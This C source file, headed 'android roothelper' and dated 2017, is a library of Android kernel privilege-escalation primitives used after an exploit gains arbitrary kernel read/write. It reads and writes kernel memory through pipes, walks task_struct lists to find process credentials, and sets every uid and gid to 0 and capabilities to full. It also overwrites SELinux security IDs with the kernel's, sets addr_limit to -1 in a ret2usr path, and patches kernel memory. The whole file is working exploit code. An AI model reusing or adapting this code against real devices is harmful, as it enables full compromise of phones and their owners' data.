/*
 * android roothelper, is lazy and powerfull.
 *
 * Copyright (C) 2017 by idhyt3r@gmail.com
 *
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

#include "roothelper.h"
#include "log.h"

static struct task_struct_partner root_tsp = { 0 };


ssize_t pipe_read_memory(const void *src, void *dest, size_t count) {
  int pipefd[2] = {0};
  ssize_t len = 0;
  if (pipe(pipefd) < 0) {
    log_dump(LOG_ERR, "pipe failed\n");
    return -1;
  }
  errno = 0;
  len = write(pipefd[1], src, count);
  if (len != count) {
    log_dump(LOG_ERR, "[-] FAILED READ @ %p : %d, errno = %d, msg = %s\n", src,
             (int)len, errno, strerror(errno));
    close(pipefd[0]);
    close(pipefd[1]);
    return -1;
  }
  read(pipefd[0], dest, count);
  close(pipefd[0]);
  close(pipefd[1]);
  return len;
}

ssize_t pipe_write_memory(void *dest, const void *src, size_t count) {
  int pipefd[2] = {0};
  ssize_t len = 0;
  if (pipe(pipefd) < 0) {
    log_dump(LOG_ERR, "pipe failed\n");
    return -1;
  }
  write(pipefd[1], src, count);

  errno = 0;
  len = read(pipefd[0], dest, count);
  if (len != count) {
    log_dump(LOG_ERR, "[-] FAILED WRITE @ %p : %d, errno = %d, msg = %s\n",
             dest, (int)len, errno, strerror(errno));
    close(pipefd[0]);
    close(pipefd[1]);
    return -1;
  }
  close(pipefd[0]);
  close(pipefd[1]);
  return len;
}

void patch_memory(char is_patch, struct patch_gadget patch[]) {
  log_dump(LOG_DEBUG, "[*] patch memory.\n");

  unsigned long patch_address = 0;
  unsigned long patch_value = 0;
  unsigned long patch_length = 0;

  int i = 0;
  for (i = 0; i < 0x10; ++i) {
    if (patch[i].addr == 0 && patch[i].value == 0) break;

    patch_address = patch[i].addr;
    patch_length = patch[i].len;

    pipe_read_memory((void *)patch_address, &patch_value, patch_length);
    log_dump(LOG_DEBUG, "\tbefore patch 0x%lx = 0x%lx\n", patch_address,
             patch_value);

    if (!is_patch) continue;

    patch_value = patch[i].value;
    pipe_write_memory((void *)patch_address, &patch_value, patch_length);

    patch_value = 0;
    pipe_read_memory((void *)patch_address, &patch_value, patch_length);
    log_dump(LOG_DEBUG, "\tafter patch 0x%lx = 0x%lx\n", patch_address,
             patch_value);
  }
}

static int is_cpu_timer_valid(struct list_head *cpu_timer) {
  if (cpu_timer->next != cpu_timer->prev) {
    return 0;
  }
  if ((unsigned long int)cpu_timer->next < KERNEL_START) {
    return 0;
  }
  return 1;
}

static int get_task_struct_tasks_offset(unsigned long *task_struct_addr) {
  int i = 0;
  int offset = 0;
  for (i = 0; i < 0xff; i++) {
    if (*(task_struct_addr + i) == pushable_tasks_prio)
      offset = i * BYTE_SIZE - 2 * BYTE_SIZE;
  }
  return offset;
}

static unsigned long get_task_struct_addr_by_name(
  unsigned long task_struct_addr,
  int tasks_offset,
  int comm_offset,
  char *find_task_name) {

  struct list_head *tasks_buf;
  struct list_head *pos;
  char task_comm[0x10];
  char *comm_pos;

  unsigned long find_task_struct_addr = 0;
  unsigned long task_struct_buf[CHECK_TASK_PAR_SIZE/sizeof(long)];

  struct cred *cred;
  unsigned long cred_addr = 0l;
  unsigned long real_cred_addr = 0l;

  int i = 0;
  char cycle = 0;

  if(!tasks_offset || !comm_offset) {
    log_dump(LOG_ERR, "[-] tasks_offset(0x%x) or comm_offset(0x%x) not calc!\n", tasks_offset, comm_offset);
    goto out;
  }

  pipe_read_memory((void *)task_struct_addr, task_struct_buf, sizeof task_struct_buf);
#if 0
  for (i = 0; i < ARRAY_SIZE(task_struct_buf); ++i)
  {
    log_dump(LOG_DEBUG, "\t+0x%x = 0x%lx: 0x%lx\n", 
      i*BYTE_SIZE, task_struct_addr + i*BYTE_SIZE, *((unsigned long* )(task_struct_buf + i)));
  }
#endif

  tasks_buf = (struct list_head *)(&task_struct_buf[tasks_offset / BYTE_SIZE]);

  log_dump(LOG_DEBUG, "[*] get %s thread_info tasks address\n", find_task_name);
  for (i = 0; i < 0x400; i++) {
    pos = tasks_buf->next;
    // LOGVV("\t%p: ", pos);
    // log_dump(LOG_DEBUG, "\ttasks = %p, ", pos);
    if (!is_kptr(pos) || (cycle == 2)) break;
    comm_pos = (char *)pos - tasks_offset + comm_offset;
    pipe_read_memory((void *)comm_pos, task_comm, sizeof(task_comm));
    // LOGVV("%s\n", task_comm);
    // log_dump(LOG_DEBUG, "comm = %p : %s\n", comm_pos, task_comm);
    if (strcmp(task_comm, "swapper/0") == 0) cycle++;
    if (strcmp(task_comm, find_task_name) == 0) {
      log_dump(LOG_DEBUG, "[+] %s thread_info tasks address = %p\n",
               find_task_name, pos);
      find_task_struct_addr = (unsigned long)pos;
      goto out;
    }
    memset(task_comm, 0, sizeof(task_comm));
    pipe_read_memory((void *)pos, tasks_buf, sizeof(tasks_buf));
  }

out:
  return find_task_struct_addr;
}


static int do_patch_security(
  unsigned long security_addr, 
  struct task_security_struct *tsecurity, 
  char is_patch) {

  struct task_security_struct security_buf = { 0 };

  if ((unsigned long)security_addr > KERNEL_START && (unsigned long)security_addr < SECURITY_LIMIT) {
    pipe_read_memory((void *)security_addr, &security_buf, sizeof(security_buf));

    log_dump(LOG_DEBUG, "\tbefore patch security\n");
    log_dump(LOG_DEBUG,
            "\tosid=0x%x, sid=0x%x, exec_sid=0x%x, create_sid=0x%x, "
            "keycreate_sid=0x%x, sockcreate_sid=0x%x\n",
            security_buf.osid, security_buf.sid, security_buf.exec_sid,
            security_buf.create_sid, security_buf.keycreate_sid,
            security_buf.sockcreate_sid);

    if (security_buf.osid != 0 && security_buf.sid != 0 &&
        security_buf.exec_sid == 0 && security_buf.create_sid == 0 &&
        security_buf.keycreate_sid == 0 && security_buf.sockcreate_sid == 0) {

      if(is_patch) {
        security_buf.osid = tsecurity->osid;
        security_buf.sid = tsecurity->sid;
        pipe_write_memory((void *)security_addr, &security_buf, sizeof(security_buf));

        memset(&security_buf, 0, sizeof(security_buf));
        pipe_read_memory((void *)security_addr, &security_buf, sizeof(security_buf));

        log_dump(LOG_DEBUG, "\tafter patch security\n");
        log_dump(LOG_DEBUG,
                "\tosid=0x%x, sid=0x%x, exec_sid=0x%x, create_sid=0x%x, "
                "keycreate_sid=0x%x, sockcreate_sid=0x%x\n",
                security_buf.osid, security_buf.sid, security_buf.exec_sid,
                security_buf.create_sid, security_buf.keycreate_sid,
                security_buf.sockcreate_sid);

        log_dump(LOG_DEBUG, "\tpatch security success.\n");

      } else {
        tsecurity->osid = security_buf.osid;
        tsecurity->sid = security_buf.sid;
      }

      return 0;
    }
  }

  return -1;
}


static int get_init_task_struct_ptn(
  unsigned long task_struct_addr, 
  unsigned long task_security_offset,
  struct task_struct_partner* tsp) {

  log_dump(LOG_DEBUG, "[*] get %s task_struct partner\n", tsp->task_name);

  unsigned long task_struct_buf[CHECK_TASK_PAR_SIZE/sizeof(long)];
  unsigned long replacement_session_keyring;

  unsigned long addr, value;

  struct cred *cred;
  struct cred cred_buf = {0};

  unsigned long cred_addr = 0l;
  unsigned long real_cred_addr = 0l;

  int tasks_to_comm_offset;

  struct task_security_struct *security;
  struct task_security_struct security_buf = { 0 };

  char cycle = 0;

  int i = 0, ret = 0;

  pipe_read_memory((void *)task_struct_addr, task_struct_buf, sizeof(task_struct_buf));

#if 0
  for (i = 0; i < ARRAY_SIZE(task_struct_buf); ++i)
  {
    log_dump(LOG_DEBUG, "\t+0x%x = 0x%lx: 0x%lx\n", 
      i*BYTE_SIZE, task_struct_addr + i*BYTE_SIZE, *((unsigned long* )(task_struct_buf + i)));
  }
#endif

  for (i = 0; i < ARRAY_SIZE(task_struct_buf); i++) {
    struct task_struct_partial *task = (struct task_struct_partial *)&task_struct_buf[i];

    if (is_cpu_timer_valid(&task->cpu_timers[0]) &&
        is_cpu_timer_valid(&task->cpu_timers[1]) &&
        is_cpu_timer_valid(&task->cpu_timers[2]) &&
        task->real_cred == task->cred && 
        (unsigned long)task->cred > KERNEL_START) {
      cred = task->cred;
      real_cred_addr = (unsigned long)task->cred;
      cred_addr = (unsigned long)task->cred;

      tsp->comm_offset = task->comm - (char *)task_struct_buf;
      log_dump(LOG_DEBUG, "\t[+] task_struct_comm_offset = 0x%x\n", tsp->comm_offset);
      
      tsp->cred_offset = tsp->comm_offset - BYTE_SIZE;
      log_dump(LOG_DEBUG, "\t[+] task_struct_cred_offset = 0x%x\n", tsp->comm_offset);

      // check struct cred *replacement_session_keyring
      log_dump(LOG_DEBUG, "\t[!] check the replacement_session_keyring is exist?\n");
      replacement_session_keyring = *((unsigned long *)&task->comm);
      // log_dump(LOG_DEBUG, "\t[!] replacement_session_keyring = 0x%lx\n", replacement_session_keyring);
      if(!replacement_session_keyring) {
        tsp->comm_offset += BYTE_SIZE;
        tsp->cred_offset -= BYTE_SIZE;
        log_dump(LOG_DEBUG, "\t[+] replacement_session_keyring is exist!\n");
        log_dump(LOG_DEBUG, "\t[+][+] task_struct_comm_offset = 0x%x\n", tsp->comm_offset);
        log_dump(LOG_DEBUG, "\t[+][+] task_struct_cred_offset = 0x%x\n", tsp->cred_offset);
      }

      if(tsp->comm_offset > 0) {
        log_dump(LOG_DEBUG, "\t[+] task_struct_comm_offset = 0x%x\n", tsp->comm_offset);
      } else {
        log_dump(LOG_ERR, "\t[-] get task_struct_comm_offset error!\n");
        ret = -1;
        goto out;
      }

      if(tsp->cred_offset > 0) {
        log_dump(LOG_DEBUG, "\t[+] task_struct_cred_offset = 0x%x\n", tsp->cred_offset);
      } else {
        log_dump(LOG_ERR, "\t[-] get task_struct_cred_offset error!\n");
        ret = -1;
        goto out;
      }

      log_dump(LOG_DEBUG, "\t+0x%x current executable name: %s\n", tsp->comm_offset, (char *)&task_struct_buf + tsp->comm_offset);

      // get task_struct_tasks_offset
      tsp->tasks_offset = def_task_struct_tasks_offset;
#ifdef pushable_tasks_prio
      tsp->tasks_offset = get_task_struct_tasks_offset(task_struct_buf);
#endif
      if(tsp->tasks_offset > 0) {
        log_dump(LOG_DEBUG, "\t[+] task_struct_tasks_offset = 0x%x\n", tsp->tasks_offset);
      } else {
        log_dump(LOG_ERR, "\t[-] get task_struct_tasks_offset error!\n");
        ret = -1;
        goto out;
      }

      tasks_to_comm_offset = tsp->comm_offset - tsp->tasks_offset;

      if(tasks_to_comm_offset > 0) {
        log_dump(LOG_DEBUG, "\t[+] tasks_to_comm_offset = 0x%x\n", tasks_to_comm_offset);
      } else {
        log_dump(LOG_ERR, "\t[-] get tasks_to_comm_offset(%d) error!\n", tasks_to_comm_offset);
        ret = -1;
        goto out;
      }
      goto find_init_sid;
    }
  }

find_init_sid:
  log_dump(LOG_DEBUG, "[*] to find init task sid\n");
  tsp->task_struct_addr = get_task_struct_addr_by_name(task_struct_addr, tsp->tasks_offset, tsp->comm_offset, tsp->task_name);

  if(!is_kptr(tsp->task_struct_addr)) {
    log_dump(LOG_ERR, "[-] get %s task addr error!\n", tsp->task_name);
    ret = -1;
    goto out;
  }

  log_dump(LOG_DEBUG, "[+] %s task_struct_addr = 0x%lx\n", tsp->task_name, tsp->task_struct_addr);

#if 0
  pipe_read_memory((void *)tsp->task_struct_addr, task_struct_buf, sizeof(task_struct_buf));

  for (i = 0; i < ARRAY_SIZE(task_struct_buf); ++i)
  {
    log_dump(LOG_DEBUG, "\t+0x%x = 0x%lx: 0x%lx\n", 
      i*BYTE_SIZE, task_struct_addr + i*BYTE_SIZE, *((unsigned long* )(task_struct_buf + i)));
  }
#endif

  addr = tsp->task_struct_addr - tsp->tasks_offset + tsp->cred_offset;

  pipe_read_memory((void *)addr, (void *)&value, sizeof(value));

  cred = (struct cred *) value;

  if (cred == NULL) {
    log_dump(LOG_ERR, "[-] get init_task_cred (%p) error!\n", cred);
    ret = -1;
    goto out;
  }

  log_dump(LOG_DEBUG, "[+] task_cred = %p\n", cred);

  pipe_read_memory(cred, &cred_buf, sizeof(cred_buf));

  security = (struct task_security_struct *)(*((unsigned long *)((char *)&cred_buf + task_security_offset)));
  log_dump(LOG_DEBUG, "[+] security = %p\n", security);

  return do_patch_security((unsigned long)security, &tsp->credp.security, 0);

out:
  return ret;

}

static int root_tsp_prepare(unsigned long init_task_addr, int task_security_offset, int task_cred_uid_offset) {

  memset(&root_tsp, 0, sizeof(root_tsp));

  strncpy(root_tsp.task_name, INIT_TASK_COMM, strlen(INIT_TASK_COMM));
  root_tsp.credp.security_offset = task_security_offset;
  root_tsp.credp.uid_offset = task_cred_uid_offset;
  root_tsp.credp.security.osid = SECINITSID_KERNEL;
  root_tsp.credp.security.sid = SECINITSID_KERNEL;

  if (get_init_task_struct_ptn(init_task_addr, root_tsp.credp.security_offset, &root_tsp) < 0) {
    return -1;
  }

#if 1
  log_dump(LOG_DEBUG, "\ninit task struct partner\n");
  log_dump(LOG_DEBUG, "\ttask_name = %s\n", root_tsp.task_name);
  log_dump(LOG_DEBUG, "\ttask_struct_addr = 0x%lx\n", root_tsp.task_struct_addr);
  log_dump(LOG_DEBUG, "\tcomm_offset = 0x%x\n", root_tsp.comm_offset);
  log_dump(LOG_DEBUG, "\tcred_offset = 0x%x\n", root_tsp.cred_offset);
  log_dump(LOG_DEBUG, "\ttasks_offset = 0x%x\n", root_tsp.tasks_offset);
  log_dump(LOG_DEBUG, "\tuid_offset = 0x%x\n", root_tsp.credp.uid_offset);
  log_dump(LOG_DEBUG, "\tsecurity_offset = 0x%x\n", root_tsp.credp.security_offset);
  log_dump(LOG_DEBUG, "\tosid = 0x%x\n", root_tsp.credp.security.osid);
  log_dump(LOG_DEBUG, "\tsid = 0x%x\n", root_tsp.credp.security.sid);
  log_dump(LOG_DEBUG, "\n");
#endif

  if(!root_tsp.comm_offset || !root_tsp.cred_offset || !root_tsp.tasks_offset || !root_tsp.task_struct_addr ) {
    log_dump(LOG_DEBUG, "[-] get init task struct obj offset error!\n");
    return -1;
  }

  return 0;
}


// after kernel rw arbitrary
int obtain_root_by_task_name(unsigned long init_task_addr, char *task_name,
                             int task_security_offset, int task_cred_uid_offset) {

  unsigned long task_tasks_address = 0;
  struct cred * task_cred;
  struct cred cred_buf = { 0 };
  struct cred_partial* task_cred_partial;

  unsigned long addr, value;

  if(root_tsp_prepare(init_task_addr, task_security_offset, task_cred_uid_offset) < 0) {
    return -1;
  }

  log_dump(LOG_DEBUG, "[+] init task osid = 0x%x, sid = 0x%x\n", root_tsp.credp.security.osid, root_tsp.credp.security.sid);
  

  task_tasks_address = get_task_struct_addr_by_name(
    init_task_addr, 
    root_tsp.tasks_offset, 
    root_tsp.comm_offset, 
    task_name);

  if(!task_tasks_address) {
    log_dump(LOG_ERR, "[+] get [%s] task_struct_tasks address error!\n", task_name);
    return -1;
  }

  log_dump(LOG_DEBUG, "[+] %s task_struct->tasks = 0x%lx\n", task_name, task_tasks_address);

  addr = task_tasks_address - root_tsp.tasks_offset + root_tsp.cred_offset;

  pipe_read_memory((void *)addr, (void *)&value, sizeof(value));

  task_cred = (struct cred *) value;

  if (task_cred == NULL) {
    log_dump(LOG_ERR, "[-] get task_cred error!\n");
    return -1;
  }

  log_dump(LOG_DEBUG, "[+] task_cred = %p\n", task_cred);

  pipe_read_memory(task_cred, &cred_buf, sizeof(cred_buf));

  // if(task_cred_uid_offset) 
  {
    task_cred_partial = (struct cred_partial *) ((char *)&cred_buf + root_tsp.credp.uid_offset);
  }

  task_cred_partial->uid = 0;
  task_cred_partial->gid = 0;
  task_cred_partial->suid = 0;
  task_cred_partial->sgid = 0;
  task_cred_partial->euid = 0;
  task_cred_partial->egid = 0;
  task_cred_partial->fsuid = 0;
  task_cred_partial->fsgid = 0;
  task_cred_partial->cap_inheritable.cap[0] = 0xffffffff;
  task_cred_partial->cap_inheritable.cap[1] = 0xffffffff;
  task_cred_partial->cap_permitted.cap[0] = 0xffffffff;
  task_cred_partial->cap_permitted.cap[1] = 0xffffffff;
  task_cred_partial->cap_effective.cap[0] = 0xffffffff;
  task_cred_partial->cap_effective.cap[1] = 0xffffffff;
  task_cred_partial->cap_bset.cap[0] = 0xffffffff;
  task_cred_partial->cap_bset.cap[1] = 0xffffffff;

  pipe_write_memory(task_cred, &cred_buf, sizeof(cred_buf));

  struct task_security_struct *security = (struct task_security_struct *)(*(
      (unsigned long *)((char *)&cred_buf + root_tsp.credp.security_offset)));
  log_dump(LOG_DEBUG, "[+] security = %p\n", security);

  return do_patch_security((unsigned long)security, &root_tsp.credp.security, 1);

}

int check_arbitrary_rwcap(unsigned long check_addr) {
  int err;

  unsigned long value;

  if (pipe_read_memory((void*)check_addr, (void*)&value, sizeof(value)) != sizeof(value)) {
    log_dump(LOG_ERR, "[-] get arbitrary r/w capacity failed!\n");
    err = -1;
    goto out;
  }

  err = 0;
  log_dump(LOG_DEBUG, "[+] get arbitrary r/w capacity succeeded: [0x%lx] = 0x%lx\n", check_addr, value);
  
out:
  return err;
}


int obtain_root_by_arbitrary_rwcap(
  unsigned long init_task_addr, 
  int task_security_offset, 
  int task_cred_uid_offset,
  char is_patch) {

  unsigned long value = 0;

  if(check_arbitrary_rwcap(init_task_addr) < 0) {
    return -1;
  }

  log_dump(LOG_DEBUG, "[!] set random task name\n");

  char random_name[0x10] = { 0 };
  set_random_task_name(4, random_name);

  log_dump(LOG_DEBUG, "[!] obtain root by task name\n");

  obtain_root_by_task_name(init_task_addr, random_name, task_security_offset, task_cred_uid_offset);

  log_dump(LOG_DEBUG, "[!] patch memory for something.\n");

  patch_memory(is_patch, p_patch);

  return 0;

}

// no pxn, mainly to arm 32

static inline struct thread_info* get_current_thread_info() {
  unsigned long sp;
  asm ("mov %[sp], sp" : [sp] "=r" (sp));
  return (struct thread_info*)(sp & ~(THREAD_SIZE - 1));
}

struct thread_info* obtain_arbitrary_rwcap_by_ret2usr() {
  struct thread_info *ti;
  ti = get_current_thread_info();
  ti->addr_limit = -1;
  return ti;
}

int obtain_root_by_ret2usr(
  int task_security_offset, 
  int task_cred_uid_offset, 
  int init_sid) {

  struct thread_info *ti;

  struct cred *cred;
  struct task_security_struct *security;
  struct cred_partial *task_cred_partial;
  int i;

  ti = get_current_thread_info();
  ti->addr_limit = -1;

  cred = NULL;

  for (i = 0; i < CHECK_TASK_PAR_SIZE; i += 4) {
    struct task_struct_partial *task = ((void *)ti->task) + i;

    if (is_cpu_timer_valid(&task->cpu_timers[0]) &&
        is_cpu_timer_valid(&task->cpu_timers[1]) &&
        is_cpu_timer_valid(&task->cpu_timers[2]) &&
        task->real_cred == task->cred) {
      cred = task->cred;
      break;
    }
  }

  if (!cred ) return -1;

  task_cred_partial =
      (struct cred_partial *)((char *)cred + task_cred_uid_offset);

  task_cred_partial->uid = 0;
  task_cred_partial->gid = 0;
  task_cred_partial->suid = 0;
  task_cred_partial->sgid = 0;
  task_cred_partial->euid = 0;
  task_cred_partial->egid = 0;
  task_cred_partial->fsuid = 0;
  task_cred_partial->fsgid = 0;
  task_cred_partial->cap_inheritable.cap[0] = 0xffffffff;
  task_cred_partial->cap_inheritable.cap[1] = 0xffffffff;
  task_cred_partial->cap_permitted.cap[0] = 0xffffffff;
  task_cred_partial->cap_permitted.cap[1] = 0xffffffff;
  task_cred_partial->cap_effective.cap[0] = 0xffffffff;
  task_cred_partial->cap_effective.cap[1] = 0xffffffff;
  task_cred_partial->cap_bset.cap[0] = 0xffffffff;
  task_cred_partial->cap_bset.cap[1] = 0xffffffff;

  security = (struct task_security_struct *)((char *)cred + task_security_offset);

  if (security) {
    if (security->osid != 0 && security->sid != 0 && security->exec_sid == 0 &&
        security->create_sid == 0 && security->keycreate_sid == 0 &&
        security->sockcreate_sid == 0) {
      security->osid = 1;
      security->sid = 1;
      if(init_sid > 0) {
        security->osid = init_sid;
        security->sid = init_sid;
      }
    }
  }

  return 0;

}

/* ---------------- prctl ---------------- */
#include <sys/prctl.h>
#include <time.h>

int get_process_name(char *name) {
#if 1
  char dir[0xff] = {0};
  memset(dir, 0, sizeof(dir));
  char *pos = NULL;
  if (readlink("/proc/self/exe", dir, sizeof(dir)) <= 0) {
    log_dump(LOG_ERR, "[-] readlink faled.\n");
    return -1;
  }
  log_dump(LOG_DEBUG, "current process path = %s\n", dir);
  pos = strrchr(dir, '/');
  if (pos == NULL) return -1;
  pos++;
  strcpy(name, pos);
  log_dump(LOG_DEBUG, "current process name = %s\n", name);
#else
  prctl(PR_GET_NAME /*16*/, name, 0, 0, 0);
  printf("%s\n", name);
#endif
  return 0;
}

void set_task_name(char *name) {
  char old_name[0xff] = {0};
  char new_name[0xff] = {0};
  prctl(PR_GET_NAME /*16*/, old_name, 0, 0, 0);
  prctl(PR_SET_NAME /*15*/, name, 0, 0, 0);
  prctl(PR_GET_NAME /*16*/, new_name, 0, 0, 0);
  log_dump(LOG_DEBUG, "[+] set task name form '%s' to '%s'\n", old_name,
           new_name);
}

void set_random_task_name(int len, char *name) {
  int i;
  char random_name[0x10] = { 0 };

  srand((int)time(0));

  for(i = 0; i < len; ++i) {
    random_name[i] = 'A' + rand() % 26;
  }

  set_task_name(random_name);

  strncpy(name, random_name, len);
}

/* ---------------- bind cpu ---------------- */

#include <sched.h>
#include <sys/syscall.h>

volatile int bind_cpu_id = 0;

void set_bind_cpu_id() {
  bind_cpu_id = sched_getcpu();
  log_dump(LOG_DEBUG, "[!] all will bind on cpu[%d]\n", bind_cpu_id);
}

#if 0
int bind_process_on_cpu(int cpuid) {return 1;}
int bind_thread_on_cpu(int cpuid) {return 1;}
#else
int bind_process_on_cpu(int cpuid) {
  log_dump(LOG_DEBUG, "[!] process(%d) prepare bind on cpu[%d].\n", getpid(), cpuid);

  int bind_cpu = -1;
  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(cpuid, &mask);

  while (0 == CPU_ISSET(cpuid, &mask)) {
    log_dump(LOG_ERR, "CPU_SET");
    CPU_SET(cpuid, &mask);
  }

  if (cpuid == 7)
    return sched_setaffinity(0 /* pid self */, sizeof(mask), &mask);

  while (bind_cpu != cpuid) {
    sched_setaffinity(0 /* pid self */, sizeof(mask), &mask);
    bind_cpu = sched_getcpu();
  }
  log_dump(LOG_DEBUG, "[+] process(%d) now bind on cpu[%d].\n", getpid(), bind_cpu);

  return bind_cpu;
}

int bind_thread_on_cpu(int cpuid) {
  int bind_cpu = -1, ret = -1, tid = -1;
  tid = gettid();

  // log_dump(LOG_DEBUG, "[!] thread(%d) prepare bind on cpu[%d].\n", tid, cpuid);

  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(cpuid, &mask);

  while (0 == CPU_ISSET(cpuid, &mask)) {
    log_dump(LOG_ERR, "CPU_SET");
    CPU_SET(cpuid, &mask);
  }

  if (cpuid == 7)
    return syscall(__NR_sched_setaffinity, tid, sizeof(mask), &mask);

  while (bind_cpu != cpuid || ret != 0) {
    ret = syscall(__NR_sched_setaffinity, tid, sizeof(mask), &mask);
    bind_cpu = sched_getcpu();
    // printf("ret = %d, bind_cpu = %d\n", ret, bind_cpu);
    // log_dump(LOG_ERR, "__NR_sched_setaffinity");
  }

  // log_dump(LOG_DEBUG, "[+] thread(%d) now bind on cpu[%d].\n", tid, bind_cpu);

  return bind_cpu;
}
#endif

void printf_kernel_buffer(unsigned long addr, int len) {
  printf("read kernel 0x%lx:\n", addr);
  int i;
  char buf[len];
  memset(buf, 0, len);
  pipe_read_memory((void *)addr, &buf, sizeof(buf));

  for (i = 0; i < len; i++) {
    if (i > 0) {
      if (i % 0x8 == 0) printf(" ");
      if (i % 0x10 == 0) printf("\n");
    }
    printf("%02x ", buf[i]);
  }
  printf("\n");
}

int call_ptmx_fops_check_flags(char * arg) {
  int fd, ret;

  errno = 0;
  fd = open("/dev/ptmx", O_RDWR, 0);
  if (fd < 0) {
    log_dump(LOG_ERR, "[-] open false, errno = %d, msg = %s\n", errno, strerror(errno));
    return -1;
  }

  errno = 0;
  ret = fcntl(fd, F_SETFL, arg);
  if (ret < 0) {
    log_dump(LOG_ERR, "[-] fcntl false, ret = 0x%lx, errno = %d, msg = %s\n", ret, errno, strerror(errno));
    // return -1;
  } else {
    log_dump(LOG_DEBUG, "[+] fcntl succeed, ret = 0x%lx, errno = %d, msg = %s\n", ret, errno, strerror(errno));
  }

  return ret;
}

int show_task_info_by_arbitrary_rwcap(unsigned long task_struct, int task_security_offset, int task_cred_uid_offset) {
  char task_st[CHECK_TASK_PAR_SIZE] = { 0 };
  struct cred cred = { 0 };
  struct cred_partial *cred_partial;
  struct task_security_struct security = { 0 };
  unsigned long cred_addr;
  unsigned long security_addr;

  printf("------ task ------\n");
  pipe_read_memory((void *)task_struct, &task_st[0], sizeof(task_st));
#if 0
  int i;
  for(i = 0; i < sizeof(task_st); i+=4) {
    printf("+0x%x = 0x%x\n", i, *(unsigned int *)((char *)&task_st[i]));
  }
#endif

  cred_addr = *(unsigned long *)&task_st[root_tsp.cred_offset];

  printf("cred = 0x%lx\n", cred_addr);
  printf("comm = %s\n", (char *)&task_st[root_tsp.comm_offset]);

  printf("------ cred ------\n");
  pipe_read_memory((void *)cred_addr, &cred, sizeof(cred));

#if 0
  int i;
  for(i = 0; i < sizeof(cred); i+=4) {
    printf("+0x%x = 0x%x\n", i, *(unsigned int *)((char *)&cred + i));
  }
#endif

  cred_partial = (struct cred_partial *)((char *)&cred + task_cred_uid_offset);

  printf("uid = 0x%x\n", cred_partial->uid);
  printf("gid = 0x%x\n", cred_partial->gid);
  printf("suid = 0x%x\n", cred_partial->suid);
  printf("sgid = 0x%x\n", cred_partial->sgid);
  printf("euid = 0x%x\n", cred_partial->euid);
  printf("egid = 0x%x\n", cred_partial->egid);
  printf("fsuid = 0x%x\n", cred_partial->fsuid);
  printf("fsgid = 0x%x\n", cred_partial->fsgid);
  printf("cap_inheritable.cap[0] = 0x%x\n", cred_partial->cap_inheritable.cap[0]);
  printf("cap_inheritable.cap[1] = 0x%x\n", cred_partial->cap_inheritable.cap[1]);
  printf("cap_permitted.cap[0] = 0x%x\n", cred_partial->cap_permitted.cap[0]);
  printf("cap_permitted.cap[1] = 0x%x\n", cred_partial->cap_permitted.cap[1]);
  printf("cap_effective.cap[0] = 0x%x\n", cred_partial->cap_effective.cap[0]);
  printf("cap_effective.cap[1] = 0x%x\n", cred_partial->cap_effective.cap[1]);
  printf("cap_bset.cap[0] = 0x%x\n", cred_partial->cap_bset.cap[0]);
  printf("cap_bset.cap[1] = 0x%x\n", cred_partial->cap_bset.cap[1]);

  printf("------ security ------\n");
  security_addr = *(unsigned long *)((char *)&cred + task_security_offset);

  pipe_read_memory((void *)security_addr, &security, sizeof(security));
  printf("security = 0x%lx\n", security_addr);
  printf("osid = 0x%x\n", security.osid);
  printf("sid = 0x%x\n", security.sid);
  printf("exec_sid = 0x%x\n", security.exec_sid);
  printf("create_sid = 0x%x\n", security.create_sid);
  printf("keycreate_sid = 0x%x\n", security.keycreate_sid);
  printf("sockcreate_sid = 0x%x\n", security.sockcreate_sid);

  return 0;
}


int show_thread_info_by_arbitrary_rwcap(unsigned long th_sp, int task_security_offset, int task_cred_uid_offset) {
  struct thread_info ti = { 0 };
  unsigned long task_addr;

  printf("th_sp = 0x%lx, task_security_offset = 0x%x, task_cred_uid_offset = 0x%x\n", 
    th_sp, task_security_offset, task_cred_uid_offset);

  printf("------ thread_info ------\n");
  pipe_read_memory((void *)th_sp, &ti, sizeof(ti));
  task_addr = (unsigned long)ti.task;
  printf("addr_limit = 0x%lx\n", ti.addr_limit);
  printf("task = 0x%lx\n", task_addr);

  show_task_info_by_arbitrary_rwcap(task_addr, task_security_offset, task_cred_uid_offset);
  return 0;
}


/* ---------------- heap spray ---------------- */

/*
  spray by keyctl: security/keys/keyctl.c
  
  SYSCALL_DEFINE5(keyctl, ...) { keyctl_update_key(); }
  

  SYSCALL_DEFINE5(add_key, ...) { }


*/
// spray by keyctl_update_key
// spray by keyctl.c: SYSCALL_DEFINE5(keyctl

/* ---------------- test code ---------------- */
// #define TEST

#ifdef TEST

void roothelper_test() {
  // int start = 0, end = 0;
  // get_range_of_kernel_data(&start, &end);

  unsigned long task_tasks_address = get_task_struct_tasks_address(
      (unsigned long)0xffffffc001779fe0, "swapper");

  printf("swapper task_tasks_address = 0x%lx\n", task_tasks_address);
}

static void *test_thread_bind_on_cpu() {
  bind_thread_on_cpu(bind_cpu_id);
  int i;
  // while(1)
  {
    for (i = 0; i < 4; ++i) {
      bind_thread_on_cpu(i);
      usleep(10 * 1000);
    }
    LOGVV(".");
  }

  while (1) {
  };
}

static void test_bind_cpu() {
  set_bind_cpu_id();
  LOGVV("cur_cpu_id = %d, bind_cpu_id = %d\n", sched_getcpu(), bind_cpu_id);

  bind_process_on_cpu(bind_cpu_id);
#if 1
  int i;
  // while(1)
  {
    for (i = 0; i < 3; ++i) {
      bind_process_on_cpu(i);
      usleep(10 * 1000);
    }
    LOGVV(".");
  }
#endif
  LOGVV("cur_cpu_id = %d, bind_cpu_id = %d\n", sched_getcpu(), bind_cpu_id);
  exit(0);

  pthread_t th;

  if (pthread_create(&th, NULL, test_thread_bind_on_cpu, NULL) != 0) {
    LOGVV("[-] pthread_create error\n");
  }

  while (1) {
  };
  exit(0);
}


#endif
